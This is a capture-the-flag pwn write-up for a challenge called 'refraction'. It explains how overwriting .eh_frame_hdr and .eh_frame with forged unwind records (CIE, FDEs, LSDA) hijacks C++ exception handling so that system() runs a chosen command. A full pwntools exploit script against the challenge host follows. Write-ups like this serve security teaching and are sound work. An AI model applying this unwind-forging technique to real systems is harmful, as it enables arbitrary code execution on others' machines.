# refraction

**Category:** pwn

---

#### Description

The binary reads `0x100` bytes from stdin into `__GNU_EH_FRAME_HDR` (the `.eh_frame_hdr` / `.eh_frame` area), then immediately throws a C++ exception (`throw "eh?";`).\
This means our only input is a controlled overwrite of the unwind metadata that libgcc/libstdc++ consults during exception unwinding.

Goal: forge unwind info so the unwinder “finds” a handler that ends up executing `system("cat flag.txt")`.

#### Solution

We overwrite `.eh_frame_hdr` and the beginning of `.eh_frame` with a minimal, valid set of unwind records:

* A forged `.eh_frame_hdr` table with 2 entries:
  * one FDE covering `f()` (where the exception originates)
  * one FDE covering a fake “handler function” range `0x1200..0x1400` (covers both main’s return IP `0x125a` and the chosen landing pad `0x1213`)
* A CIE using augmentation `"zPLR"` so we can provide:
  * a personality (`__gxx_personality_v0`)
  * an LSDA pointer encoding
  * an FDE pointer encoding
* Two FDEs:
  1. **FDE for `f()`**: we make unwinding *pretend* the caller frame is inside our fake handler range, and we prepare registers for the landing pad.
     * `DW_CFA_def_cfa_expression`: sets the *CFA* to point at our command string in the overwrite buffer.
     * `DW_CFA_val_expression` for **RIP**: spoofs the caller RIP into `handler_start+1` so the next frame lookup uses our handler FDE.
     * `DW_CFA_val_expression` for **RSP**: restores the *real* stack pointer (`rbp+16`) so `system()` has plenty of stack space. (If RSP stayed in our tiny `.eh_frame` page, `system()` crashes due to stack underflow.)
  2. **FDE for the handler range**: provides an LSDA that catches `const char*` and sets the landing pad to `0x1213` (`call system@plt` inside `g()`’s catch block).

At the landing pad, empirically `RDI` ends up equal to the CFA-derived value on this target, so `system()` receives a pointer to our command string while still running on the real stack (thanks to the explicit RSP rule).

Run:

* Local: `python3 solve2.py --local`
* Remote: `python3 solve2.py`

Solution code (`solve2.py`):

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import struct
from dataclasses import dataclass

from pwn import context, process, remote


def p8(x: int) -> bytes:
    return struct.pack("<B", x & 0xFF)


def p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def p32s(x: int) -> bytes:
    return struct.pack("<i", int(x))


def uleb128(x: int) -> bytes:
    assert x >= 0
    out = bytearray()
    while True:
        b = x & 0x7F
        x >>= 7
        if x:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def sleb128(x: int) -> bytes:
    out = bytearray()
    more = True
    while more:
        b = x & 0x7F
        x_shifted = x >> 7
        sign_bit = b & 0x40
        more = not ((x_shifted == 0 and sign_bit == 0) or (x_shifted == -1 and sign_bit != 0))
        out.append((b | 0x80) if more else b)
        x = x_shifted
    return bytes(out)


@dataclass(frozen=True)
class VMA:
    # Link-time VMAs. PIE base cancels out for pcrel/datarel computations.
    eh_frame_hdr: int = 0x2010
    eh_frame: int = 0x2048

    f_start: int = 0x11A9
    f_size: int = 0x2F

    # Fake "handler function" range that covers main's IP (0x125a) and our landing pad (0x1213).
    handler_start: int = 0x1200
    handler_size: int = 0x200

    landing_pad: int = 0x1213  # `call system@plt` inside g()'s catch block

    # Useful constants in the binary
    main_ret_after_f: int = 0x125A  # return address after `call f()` in main
    typeinfo_charptr: int = 0x3D40  # _ZTIPKc
    dw_ref_personality: int = 0x4018  # DW.ref.__gxx_personality_v0


def align4(x: int) -> int:
    return (x + 3) & ~3


def build_eh_frame_hdr(*, entries: list[tuple[int, int]]) -> bytes:
    """
    Minimal .eh_frame_hdr (version 1) with a datarel sdata4 table.
    """
    v = VMA()
    hdr = bytearray()
    hdr += p8(0x01)  # version
    hdr += p8(0x1B)  # eh_frame_ptr_enc: DW_EH_PE_pcrel | DW_EH_PE_sdata4
    hdr += p8(0x03)  # fde_count_enc: DW_EH_PE_udata4
    hdr += p8(0x3B)  # table_enc: DW_EH_PE_datarel | DW_EH_PE_sdata4

    # Encoded pointer to .eh_frame (pcrel sdata4, base = this field)
    eh_frame_ptr_field = v.eh_frame_hdr + 4
    hdr += p32s(v.eh_frame - eh_frame_ptr_field)

    # fde_count (udata4)
    hdr += p32(len(entries))

    # Table entries: (initial_location, fde_address), both datarel sdata4.
    data_base = v.eh_frame_hdr
    for initial_loc_vma, fde_vma in entries:
        hdr += p32s(initial_loc_vma - data_base)
        hdr += p32s(fde_vma - data_base)

    # Original header is 0x34 bytes; keep size the same.
    return bytes(hdr).ljust(0x34, b"\x00")


def build_cie_zplr(*, cie_vma: int) -> bytes:
    """
    CIE with:
      - zPLR augmentation
      - personality pointer (indirect pcrel sdata4)
      - LSDA encoding (pcrel sdata4)
      - FDE encoding (pcrel sdata4)
    """
    v = VMA()
    out = bytearray()
    out += p32(0x1C)  # length
    out += p32(0x00000000)  # CIE_id
    out += p8(0x01)  # version
    out += b"zPLR\x00"
    out += uleb128(1)  # code alignment
    out += sleb128(-8)  # data alignment
    out += uleb128(16)  # return reg (RIP)
    out += uleb128(7)  # augmentation data length

    # P: personality encoding
    out += p8(0x9B)  # DW_EH_PE_indirect | DW_EH_PE_pcrel | DW_EH_PE_sdata4
    personality_ptr_field_vma = cie_vma + len(out)
    out += p32s(v.dw_ref_personality - personality_ptr_field_vma)

    # L: LSDA encoding, R: FDE encoding
    out += p8(0x1B)  # LSDA: pcrel sdata4
    out += p8(0x1B)  # FDE pointers: pcrel sdata4

    # Initial CFI: CFA = rsp + 8; RA = [CFA-8]
    out += b"\x0c\x07\x08"  # DW_CFA_def_cfa r7(rsp), 8
    out += b"\x90\x01"  # DW_CFA_offset RIP, 1 * data_align (-8) => CFA-8
    out += b"\x00\x00"  # padding

    assert len(out) == 0x20
    return bytes(out)


def build_lsda_no_handler(*, f_range: int) -> bytes:
    # LPStart omitted, no type table, one call-site entry with landing pad 0 and action 0.
    b = bytearray()
    b += p8(0xFF)  # LPStart omitted
    b += p8(0xFF)  # TType omitted
    b += p8(0x01)  # call-site encoding: uleb128
    call_site = bytearray()
    call_site += uleb128(0)  # start
    call_site += uleb128(f_range)  # length
    call_site += uleb128(0)  # landing pad = 0
    call_site += uleb128(0)  # action = 0
    b += uleb128(len(call_site))
    b += call_site
    return bytes(b)


def build_lsda_handler(*, lsda_vma: int) -> bytes:
    """
    LSDA that catches `const char*` and transfers to VMA().landing_pad.
    """
    v = VMA()
    b = bytearray()

    # LPStart omitted => bases are relative to the FDE's initial_location (handler_start).
    b += p8(0xFF)

    # Type table present; use pcrel sdata4 direct pointer to _ZTIPKc.
    b += p8(0x1B)  # TType encoding: pcrel sdata4
    ttype_off_index = len(b)
    b += p8(0x00)  # placeholder ttype_offset (we keep it 1 byte)
    pos_after_ttype = lsda_vma + len(b)

    b += p8(0x01)  # call-site encoding: uleb128

    # One call-site entry: cover full handler range.
    landing_pad_off = v.landing_pad - v.handler_start
    call_site = bytearray()
    call_site += uleb128(0)  # start
    call_site += uleb128(v.handler_size)  # length
    call_site += uleb128(landing_pad_off)  # landing pad offset
    call_site += uleb128(1)  # action table offset + 1
    b += uleb128(len(call_site))
    b += call_site

    # Action table: catch type #1, then end.
    b += sleb128(1)
    b += sleb128(0)

    # Type table: one entry placed immediately before ttype_base (end of LSDA).
    type_entry_vma = lsda_vma + len(b)
    b += p32s(v.typeinfo_charptr - type_entry_vma)

    # Patch ttype_offset so that ttype_base == end_of_lsda.
    ttype_base = lsda_vma + len(b)
    ttype_offset = ttype_base - pos_after_ttype
    assert 0 <= ttype_offset < 0x80
    b[ttype_off_index] = ttype_offset

    return bytes(b)


def build_fde_for_f(*, cie_vma: int, fde_vma: int, lsda_vma: int, cmd_vma: int) -> bytes:
    v = VMA()
    out = bytearray()

    out += p32(0)  # placeholder length
    cie_ptr_field_vma = fde_vma + len(out)
    out += p32(cie_ptr_field_vma - cie_vma)  # offset back to CIE

    # initial_location (pcrel sdata4)
    initial_loc_field_vma = fde_vma + len(out)
    out += p32s(v.f_start - initial_loc_field_vma)
    out += p32(v.f_size)  # address_range

    # Augmentation length + LSDA pointer
    out += uleb128(4)
    lsda_ptr_field_vma = fde_vma + len(out)
    out += p32s(lsda_vma - lsda_ptr_field_vma)

    # We can't reliably control caller-saved regs like RDI via CFI on all
    # libgcc builds. Empirically, arriving at our landing pad yields RDI==RSP.
    # So: set the caller frame's CFA to point at our command string, spoof the
    # caller RIP into our fake handler range, and then explicitly restore RSP
    # back onto the real stack for system().
    #
    # Unwind IP for f() is typically the return address after `call __cxa_throw`,
    # which is the next instruction at 0x11d8.
    throw_site = 0x11D8

    def expr_rip_plus(delta: int) -> bytes:
        e = bytearray()
        e += p8(0x80) + sleb128(0)  # DW_OP_breg16 (RIP) + 0
        e += p8(0x11) + sleb128(delta)  # DW_OP_consts delta
        e += p8(0x22)  # DW_OP_plus
        return bytes(e)

    # CFA = &cmd (in our overwrite buffer)
    cfa_expr = expr_rip_plus(cmd_vma - throw_site)
    out += p8(0x0F)  # DW_CFA_def_cfa_expression
    out += uleb128(len(cfa_expr))
    out += cfa_expr

    # Spoof caller RIP into our fake handler range so phase 1 consults our handler FDE/LSDA.
    handler_ip = v.handler_start + 1
    rip_expr = expr_rip_plus(handler_ip - throw_site)
    out += p8(0x16)  # DW_CFA_val_expression
    out += uleb128(16)  # reg = RIP (return address column)
    out += uleb128(len(rip_expr))
    out += rip_expr

    # Keep the actual stack pointer on the real stack:
    # rsp = rbp + 16 (standard caller RSP for a frame-pointer function).
    rsp_expr = bytearray()
    rsp_expr += p8(0x76) + sleb128(16)  # DW_OP_breg6 (RBP) + 16
    out += p8(0x16)  # DW_CFA_val_expression
    out += uleb128(7)  # reg = RSP
    out += uleb128(len(rsp_expr))
    out += bytes(rsp_expr)

    while (len(out) - 4) % 4 != 0:
        out += b"\x00"

    out[0:4] = p32(len(out) - 4)
    return bytes(out)


def build_fde_for_handler(*, cie_vma: int, fde_vma: int, lsda_vma: int) -> bytes:
    v = VMA()
    out = bytearray()

    out += p32(0)  # placeholder length
    cie_ptr_field_vma = fde_vma + len(out)
    out += p32(cie_ptr_field_vma - cie_vma)  # offset back to CIE

    initial_loc_field_vma = fde_vma + len(out)
    out += p32s(v.handler_start - initial_loc_field_vma)  # initial_location
    out += p32(v.handler_size)  # address_range

    out += uleb128(4)  # augmentation length
    lsda_ptr_field_vma = fde_vma + len(out)
    out += p32s(lsda_vma - lsda_ptr_field_vma)

    # Match main() prologue (frame pointer) so stack looks sane if unwinding continues.
    out += b"\x0c" + uleb128(6) + uleb128(16)  # DW_CFA_def_cfa rbp, 16
    out += b"\x86" + uleb128(2)  # DW_CFA_offset rbp, CFA-16

    while (len(out) - 4) % 4 != 0:
        out += b"\x00"

    out[0:4] = p32(len(out) - 4)
    return bytes(out)


def build_payload() -> bytes:
    v = VMA()
    payload = bytearray(b"\x00" * 0x100)

    cie_vma = v.eh_frame
    cie = build_cie_zplr(cie_vma=cie_vma)

    fde_f_vma = cie_vma + len(cie)
    lsda_f_vma = 0x20C0
    lsda_h_vma = 0x20D0
    cmd_vma = 0x20F0

    fde_f = build_fde_for_f(cie_vma=cie_vma, fde_vma=fde_f_vma, lsda_vma=lsda_f_vma, cmd_vma=cmd_vma)
    fde_h_vma = align4(fde_f_vma + len(fde_f))
    fde_h = build_fde_for_handler(cie_vma=cie_vma, fde_vma=fde_h_vma, lsda_vma=lsda_h_vma)

    # .eh_frame terminator after last FDE
    term_vma = fde_h_vma + len(fde_h)
    term_vma = align4(term_vma)

    lsda_f = build_lsda_no_handler(f_range=v.f_size)
    lsda_h = build_lsda_handler(lsda_vma=lsda_h_vma)

    eh_hdr = build_eh_frame_hdr(
        entries=[
            (v.f_start, fde_f_vma),
            (v.handler_start, fde_h_vma),
        ]
    )

    def put(vma: int, data: bytes) -> None:
        off = vma - v.eh_frame_hdr
        assert 0 <= off <= 0x100
        assert off + len(data) <= 0x100
        payload[off : off + len(data)] = data

    put(v.eh_frame_hdr, eh_hdr)
    put(cie_vma, cie)
    put(fde_f_vma, fde_f)
    put(fde_h_vma, fde_h)
    put(term_vma, p32(0))
    put(lsda_f_vma, lsda_f)
    put(lsda_h_vma, lsda_h)
    # Pad with spaces so small RIP differences still yield a valid `/bin/sh -c` command.
    put(cmd_vma, b"        cat flag.txt\x00")

    return bytes(payload)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="chall.lac.tf")
    ap.add_argument("--port", default=31152, type=int)
    ap.add_argument("--local", action="store_true")
    args = ap.parse_args()

    context.clear(arch="amd64", os="linux")
    payload = build_payload()

    if args.local:
        io = process(["./attachments/chall"])
    else:
        io = remote(args.host, args.port)

    io.send(payload)
    data = io.recvall(timeout=2)
    if data:
        print(data.decode(errors="replace"), end="")


if __name__ == "__main__":
    main()
```

***
